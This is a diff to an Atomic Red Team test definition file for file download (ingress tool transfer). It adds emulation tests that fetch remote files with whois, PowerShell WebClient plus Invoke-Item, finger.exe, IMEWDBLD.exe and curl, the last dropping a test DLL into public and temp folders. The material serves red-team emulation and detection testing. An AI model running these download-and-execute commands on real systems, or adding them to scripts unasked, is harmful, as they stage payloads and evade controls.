@@ -304,18 +304,18 @@ atomic_tests:
     Uses the Windows Defender to download a file from the internet (must have version 4.18.2007.8-0, 4.18.2007.9, or 4.18.2009.9 installed).
     The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
     By default, the test downloads the Atomic Red Team license file to the temp directory.
-    
+
     More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
   supported_platforms:
   - windows
   input_arguments:
     remote_file:
       description: URL of file to download
-      type: url
+      type: Url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
     local_path:
       description: Location to save downloaded file
-      type: path
+      type: Path
       default: '%temp%\Atomic-license.txt'
   dependency_executor_name: powershell
   dependencies:
@@ -334,4 +334,150 @@ atomic_tests:
     cleanup_command: |-
       del #{local_path} >nul 2>&1
       del %temp%\MpCmdRun.log >nul 2>&1
+    name: command_prompt
+- name: whois file download
+  auto_generated_guid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
+  description: |
+    Download a remote file using the whois utility
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    remote_host:
+      description: Remote hostname or IP address
+      type: String
+      default: localhost
+    remote_port:
+      description: Remote port to connect to
+      type: Integer
+      default: 8443
+    output_file:
+      description: Path of file to save output to
+      type: Path
+      default: /tmp/T1105.whois.out
+    query:
+      description: Query to send to remote server
+      type: String
+      default: "Hello from Atomic Red Team test T1105"
+    timeout:
+      description: Timeout period before ending process (seconds)
+      type: Integer
+      default: 1
+  dependencies:
+    - description: |
+        The whois and timeout commands must be present
+      prereq_command: |
+        which whois && which timeout
+      get_prereq_command: |
+        echo "Please install timeout and the whois package"
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > #{output_file}
+    cleanup_command: |
+      rm -f #{output_file}
+- name: File Download via PowerShell
+  auto_generated_guid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
+  description: |
+    Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_remote_file:
+      description: File to download
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
+    output_file:
+      description: File to write to
+      type: String
+      default: LICENSE.txt
+  executor:
+    command: |
+      (New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
+    name: powershell
+- name: File download with finger.exe on Windows
+  auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
+  description: |
+    Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
+    Because this is being tested on the localhost, you should not be expecting a successful connection
+    https://www.exploit-db.com/exploits/48815
+    https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_host:
+      description: Remote hostname or IP address
+      type: String
+      default: localhost
+  executor:
+    name: command_prompt
+    command: |
+      finger base64_filedata@#{remote_host}
+- name: Download a file with IMEWDBLD.exe
+  auto_generated_guid: 1a02df58-09af-4064-a765-0babe1a0d1e2
+  description: |
+    Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
+    Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
+    Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_url:
+      description: Location of file to be downloaded.
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
+    file_name:
+      description: Name of the file to be downloaded without extension.
+      type: string
+      default: T1105
+  executor:
+    command: |
+      $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
+      & $imewdbled #{remote_url}
+    cleanup_command: |
+      $inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\" 
+      $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
+      cmd.exe /c "del $file_to_be_removed"
+    name: powershell
+
+- name: Curl Download File
+  auto_generated_guid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
+  description: |
+    The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
+    Expected output will include whether the file downloaded successfully or not.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_download:
+      description: File to download
+      type: String
+      default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+    curl_path:
+      description: path to curl.exe
+      type: Path
+      default: C:\Windows\System32\Curl.exe
+  dependency_executor_name: powershell 
+  dependencies: 
+    - description: |
+        Curl must be installed on system.
+      prereq_command: |
+        if (Test-Path #{curl_path}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
+        Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
+        Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
+        Remove-Item $env:temp\curl
+        Remove-Item $env:temp\curl.zip
+  executor:
+    command: |
+      #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
+      #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
+      #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
+      #{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
+    cleanup_command: |
+      del c:\users\public\music\allthethingsx64.dll >nul 2>&1
+      del c:\users\public\music\allthethingsx64.dll >nul 2>&1
+      del c:\programdata\allthethingsx64.dll >nul 2>&1
+      del %Temp%\allthethingsx64.dll >nul 2>&1
     name: command_prompt
